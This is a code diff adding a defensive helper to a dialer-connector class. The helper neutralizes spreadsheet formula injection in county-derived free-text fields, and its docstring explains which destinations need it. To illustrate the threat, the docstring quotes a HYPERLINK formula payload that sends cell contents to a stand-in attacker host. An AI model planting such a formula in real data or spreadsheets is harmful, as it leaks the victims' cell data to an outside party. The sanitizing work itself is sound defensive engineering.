@@ -70,6 +70,39 @@ class DialerConnector(ABC):
             else ("dnc" if phone_dnc_flag is True else "unknown")
         )
 
+    @staticmethod
+    def spreadsheet_safe(value: str | None) -> str:
+        """Neutralize a county-derived free-text field for a destination whose
+        predictable downstream use is a spreadsheet.
+
+        THIS IS A PER-DESTINATION POLICY, NOT A GLOBAL ONE — read before reusing.
+
+        A county filing is untrusted input and can carry an owner name like
+        `=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")`. Our own CSV/XLSX
+        exports already neutralize that at generation time. The question for a
+        PUSH destination is whether it is a spreadsheet context:
+
+        - PhoneBurner: YES. Customers routinely export dialer contacts to
+          CSV/Excel, so we must not hand it a live formula. Use this helper.
+        - Generic customer webhook: NO. JSON is not an injection context, and
+          prefixing an apostrophe would corrupt the value for every consumer
+          forever, including the majority that never touch a spreadsheet.
+          Deliberately does NOT use this helper.
+
+        Sanitizing at INGEST instead was considered and rejected: it corrupts the
+        canonical value, can shift dedup hashing, and would need a migration to
+        cover rows already stored.
+
+        Apply to free text only. Do NOT apply to phone numbers: a phone in E.164
+        starts with "+", which is a formula prefix, so sanitizing it yields
+        "'+12065551234" and breaks dialing — a functional regression in exchange
+        for no real protection, since phone/email come from the enrichment
+        provider rather than from county HTML.
+        """
+        from src.api.middleware.security import sanitize_for_csv
+
+        return sanitize_for_csv(value)
+
 
 def get_connector(vendor_id: str | None) -> DialerConnector:
     """Resolve a connector instance for ``deliver.dialer_type``.
